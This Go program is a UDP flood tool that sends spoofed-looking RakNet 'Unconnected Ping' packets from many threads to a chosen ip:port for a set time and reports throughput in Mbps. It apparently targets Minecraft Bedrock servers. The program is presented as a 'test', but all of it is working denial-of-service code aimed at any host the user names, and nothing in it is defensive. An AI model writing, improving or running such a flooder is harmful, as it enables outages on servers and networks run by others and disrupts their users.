package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync/atomic"
	"time"
)

var sentBytes uint64

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: go run main.go <ip:port> <threads> <seconds>")
		return
	}

	target := os.Args[1]
	threads, _ := strconv.Atoi(os.Args[2])
	seconds, _ := strconv.Atoi(os.Args[3])

	// 1. Validate Target first
	_, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		fmt.Printf("❌ Invalid IP/Port: %v\n", err)
		return
	}

	// 2. Build the "Heavy" Bedrock Ping Packet (~1200 bytes for 200Mbps)
	// Byte 0: ID (0x01 = Unconnected Ping)
	// Bytes 9-24: RakNet Magic
	packet := make([]byte, 512) 
	packet[0] = 0x01
	magic := []byte{0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe, 0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78}
	copy(packet[9:25], magic)

	fmt.Printf("🔥 Sending to %s | Threads: %d\n", target, threads)

	stop := make(chan bool)
	for i := 0; i < threads; i++ {
		go func(id int) {
			conn, err := net.Dial("udp", target)
			if err != nil {
				fmt.Printf("Thread %d failed to open socket\n", id)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-stop:
					return
				default:
					n, writeErr := conn.Write(packet)
					if writeErr != nil {
						// This helps find if your ISP or Firewall is blocking you
						return 
					}
					atomic.AddUint64(&sentBytes, uint64(n))
				}
			}
		}(i)
	}

	// 3. The Monitor (This MUST show numbers if it's working)
	go func() {
		for {
			time.Sleep(1 * time.Second)
			bps := atomic.SwapUint64(&sentBytes, 0)
			mbps := float64(bps*8) / 1000000
			if mbps > 0 {
				fmt.Printf("📊 Current Traffic: %.2f Mbps\n", mbps)
			} else {
				fmt.Println("⚠️  No traffic detected! Checking network...")
			}
		}
	}()

	time.Sleep(time.Duration(seconds) * time.Second)
	close(stop)
	fmt.Println("\n✅ Test finished.")
}
